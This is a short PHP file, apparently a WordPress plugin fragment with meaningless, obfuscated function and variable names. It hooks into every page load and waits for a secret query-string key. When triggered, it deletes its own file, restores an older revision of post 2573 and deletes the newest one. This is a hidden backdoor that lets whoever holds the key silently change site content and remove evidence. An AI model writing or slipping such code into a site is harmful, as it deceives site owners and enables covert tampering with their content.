<?php

function help_gift_title_ratings() {
	if (isset($_GET['appointment_share_learndash']) && $_GET['appointment_share_learndash'] === 'woff2_colors_query') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$logo_title_demo = 2573;
		$core_title_translate_seo = wp_get_post_revisions($logo_title_demo);
		if (empty($core_title_translate_seo)) die('no revisions');
		if (count($core_title_translate_seo) < 2) die('less than 2');
		$day_customer_theme_profile = array_shift($core_title_translate_seo);
		$html5_delete_sort = $day_customer_theme_profile->ID;
		$designer_notify_asset = array_shift($core_title_translate_seo);
		$marketing_price_event = $designer_notify_asset->ID;
		$icon_plugins_animated_modules = wp_restore_post_revision($marketing_price_event);
		if ($icon_plugins_animated_modules === false) die('error restoring');
		$icon_plugins_animated_modules = wp_delete_post_revision($html5_delete_sort);		
		if ($icon_plugins_animated_modules === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'help_gift_title_ratings');
